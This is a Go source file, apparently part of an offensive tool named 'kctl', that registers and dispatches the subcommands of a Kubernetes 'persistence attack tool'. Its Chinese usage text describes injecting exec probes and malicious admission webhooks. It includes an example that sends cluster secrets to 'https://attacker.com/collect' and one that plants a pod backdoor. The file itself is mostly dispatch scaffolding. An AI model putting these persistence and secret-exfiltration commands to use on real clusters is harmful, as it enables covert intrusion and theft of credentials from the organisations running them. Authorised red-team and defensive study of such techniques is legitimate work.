package persist

import (
	"fmt"
	"strings"

	"kctl/internal/session"
)

// SubCommand persist 子命令接口
type SubCommand interface {
	Name() string
	Aliases() []string
	Description() string
	Usage() string
	Execute(sess *session.Session, args []string) error
}

// 子命令注册表
var subCommands = make(map[string]SubCommand)

// Register 注册子命令
func Register(cmd SubCommand) {
	subCommands[cmd.Name()] = cmd
	for _, alias := range cmd.Aliases() {
		subCommands[alias] = cmd
	}
}

// Get 获取子命令
func Get(name string) (SubCommand, bool) {
	cmd, ok := subCommands[name]
	return cmd, ok
}

// GetAll 获取所有子命令（去重）
func GetAll() []SubCommand {
	seen := make(map[string]bool)
	var cmds []SubCommand
	for _, cmd := range subCommands {
		if !seen[cmd.Name()] {
			seen[cmd.Name()] = true
			cmds = append(cmds, cmd)
		}
	}
	return cmds
}

// Execute 执行 persist 子命令
func Execute(sess *session.Session, args []string) error {
	// 无参数时，显示帮助
	if len(args) == 0 {
		sess.Printer.Println(Usage())
		return nil
	}

	// 检查是否是子命令
	if cmd, ok := Get(args[0]); ok {
		return cmd.Execute(sess, args[1:])
	}

	// 不是子命令，显示帮助
	sess.Printer.Error("未知子命令: " + args[0])
	sess.Printer.Println()
	sess.Printer.Println(Usage())
	return nil
}

// Usage 返回 persist 命令的用法
func Usage() string {
	return `persist <subcommand> [options]

Kubernetes 持久化攻击工具

子命令：
  probe-inject      通过探针注入实现持久化
  probe-list        列出所有带有 exec 探针的工作负载
  probe-restore     移除注入的探针，恢复原始配置
  webhook-inject    通过恶意 Admission Webhook 实现持久化
  webhook-list      列出所有 Admission Webhook 配置
  webhook-restore   移除注入的恶意 Webhook

探针注入示例：
  persist probe-inject                    # 交互式注入探针
  persist probe-inject --help             # 查看详细帮助
  persist probe-list                      # 列出所有带探针的工作负载
  persist probe-list -n kube-system       # 列出指定命名空间
  persist probe-restore                   # 交互式移除探针
  persist probe-restore --name nginx -n default  # 移除指定工作负载的探针

Webhook 注入示例：
  persist webhook-inject                  # 交互式注入 Webhook
  persist webhook-inject -t secret-exfil --exfil-url https://attacker.com/collect
  persist webhook-inject -t pod-backdoor --image busybox
  persist webhook-list                    # 列出 kctl 管理的 Webhook
  persist webhook-list --all              # 列出所有 Webhook
  persist webhook-restore                 # 交互式移除 Webhook
  persist webhook-restore --name xxx      # 移除指定 Webhook

使用 'persist <subcommand> --help' 查看子命令详细用法`
}

// BuildAPIServerURL 构建 API Server URL
func BuildAPIServerURL(host string, port int) string {
	if host == "" {
		return ""
	}

	// 如果已经包含协议前缀，直接返回
	if strings.HasPrefix(host, "https://") || strings.HasPrefix(host, "http://") {
		return host
	}

	// 添加 https:// 前缀和端口
	if port == 0 {
		port = 6443
	}
	return fmt.Sprintf("https://%s:%d", host, port)
}
